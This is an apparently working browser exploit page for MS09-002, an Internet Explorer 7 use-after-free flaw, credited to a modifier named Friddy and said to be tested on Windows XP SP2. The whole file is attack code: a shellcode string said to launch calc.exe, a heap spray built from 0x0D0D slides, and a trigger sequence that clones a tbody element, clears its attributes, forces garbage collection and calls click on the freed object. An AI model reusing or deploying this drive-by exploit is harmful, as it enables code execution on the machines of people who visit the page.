<script language="JavaScript">
<!--
MS09-002 Internet Exploere 7.0 Exploit
Modify by Friddy 2009.02.12 mail:qianyang@ssyeah.com
blog:www.friddy.cn
Tested under Windows XP sp2+IE 7.0
shellcode will popup the calc.exe
-->
var shellcode=unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");

var array = new Array(); 

var ls = 0x100000-(shellcode.length*2+0x01020); 

var b = unescape("%u0D0D%u0D0D"); 
while(b.length<ls) { b+=b;} 
var lh = b.substring(0,ls/2); 
delete b; 

for(i=0; i<0xD0; i++) { 
    array[i] = lh + shellcode;
} 

CollectGarbage();

var s1=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
var a1 = new Array();
for(var x=0;x<500;x++) a1.push(document.createElement("img"));
o1=document.createElement("tbody"); 
o1.click; 
var o2 = o1.cloneNode();    
o1.clearAttributes(); 
o1=null; CollectGarbage(); 
for(var x=0;x<a1.length;x++) a1[x].src=s1; 
o2.click;
</script>

